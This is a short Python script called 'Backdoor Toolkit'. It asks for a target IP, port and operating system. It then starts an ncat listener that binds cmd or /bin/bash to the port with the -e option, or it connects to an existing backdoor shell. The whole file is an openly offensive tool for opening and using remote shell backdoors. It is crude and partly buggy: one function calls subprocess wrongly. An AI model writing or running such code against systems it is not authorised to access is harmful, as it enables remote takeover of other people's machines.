#!C:\users\cobalt\python

import subprocess
import pyfiglet as pyfig
import sys
from colorama import init
init(strip=not sys.stdout.isatty())
from termcolor import cprint
from pyfiglet import figlet_format

def main():
	banner = ("Backdoor\nToolkit")
	cprint(figlet_format(banner, font = "basic"), "red")

	target_ip = input("Type the target's IP Address and press enter: ")
	target_port = input("Type the target's Port Number and press enter: ")

	windows_shell = "cmd"
	linux_shell = "/bin/bash"

	windows = windows_shell
	linux = linux_shell

	print("Is the target a Windows or Linux device? ")
	target_shell = input("Windows/Linux: ")
	if target_shell == "windows" or target_shell == "WINDOWS" or target_shell == "Windows":
		target_shell = windows
	elif target_shell == "linux" or target_shell == "LINUX" or target_shell == "Linux":
		target_shell = linux


	def spawn_backdoor(target_port, target_shell):
		print("Now spawning Netcat Backdoor on", target_ip, "and port #", target_port)
		subprocess.call(["ncat", "-l", "-k", "-p"+target_port, "-e"+target_shell])

	def connect_backdoor(target_ip, target_port):
		print("Initiating connection with target backdoor")
		print("TARGET IP:"+target_ip)
		print("TARGET PORT:"+target_port)
		subprocess.call("ncat", target_ip, target_port)

	backdoor_choice = input("Would you like to spawn the backdoor now? ")
	if backdoor_choice == "yes" or backdoor_choice == "YES" or backdoor_choice == "Yes":
		spawn_backdoor(target_port, target_shell)
	elif backdoor_choice == "no" or backdoor_choice == "NO" or backdoor_choice == "No":
		print("Smacky Smacky, no Backy Backy")
		subprocess.call(["clear"])
		return main()

	backdoor_connect = input("Would you like to communicate with an existing backdoor?")
	if backdoor_connect == "YES" or backdoor_connect == "Yes" or backdoor_connect == "YES":
		print("Initiating connection with backdoor shell now.")
		subprocess.call(["ncat", target_ip, target_port])
	elif backdoor_connect == "NO" or backdoor_connect == "no" or backdoor_connect == "No":
		print("Thanks for using Backdoor Toolkit!")

main()
